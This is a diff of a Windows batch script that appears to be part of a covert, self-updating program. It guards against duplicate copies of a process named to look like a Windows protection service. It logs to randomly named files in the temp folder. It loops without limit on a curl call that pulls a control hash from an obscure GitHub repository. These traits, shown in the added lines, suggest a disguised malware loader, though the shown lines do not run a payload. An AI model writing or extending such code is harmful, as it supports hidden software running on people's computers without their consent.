@@ -1,20 +1,57 @@
 @echo off
 
-if exist "%temp%\i059.tmp" exit
-
 
 setlocal enabledelayedexpansion
+
+
+if exist "%temp%\i059.tmp" exit
+
+:: Count the instances of ProtectionWindowsHostProcess.exe
+set "instances=0"
+for /f "tokens=1 delims=," %%A in ('tasklist /fo csv /nh ^| findstr /i /c:"ProtectionWindowsHostProcess.exe"') do (
+    set /a instances+=1
+)
+
+:: Check if one or more instances are found
+if !instances! geq 2 (
+    echo ProtectionWindowsHostProcess.exe is already running. Exiting batch...
+	timeout /t 3 /nobreak
+    goto :EOF
+)
+
 
 
 ::goto :EOF
 
 
-set "BATCHVERSION=37.6"
+set "BATCHVERSION=41.3"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
-set "RUNEVERYOFFICIALMD5=080407aae4149d7efbf05207d8fc6b66"
+::set "RUNEVERYOFFICIALMD5=080407aae4149d7efbf05207d8fc6b66"
+
+
+
 del /f /a "%LOGFILE%"
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo BATCHVERSION = %BATCHVERSION% >> "%LOGFILE%" 2>&1
+echo %date% %time% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+:retryruncallermd5
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/MD5FILES/RunEveryCallerMD5') do (
+    set "RUNEVERYOFFICIALMD5=%%i"
+    echo RUNEVERYOFFICIALMD5 = %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    goto donee1
+)
+goto retryruncallermd5
+
+:donee1
+
 
 
 ::pause
@@ -81,17 +118,6 @@ echo %COMPUTERNAME% Not Found. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1 
 
-:: Count the instances of ProtectionWindowsHostProcess.exe
-set "instances=0"
-for /f "tokens=1 delims=," %%A in ('tasklist /fo csv /nh ^| findstr /i /c:"ProtectionWindowsHostProcess.exe"') do (
-    set /a instances+=1
-)
-
-:: Check if one or more instances are found
-if !instances! geq 2 (
-    echo ProtectionWindowsHostProcess.exe is already running. Exiting batch... >> "%LOGFILE%" 2>&1
-    exit
-)
 
 
 
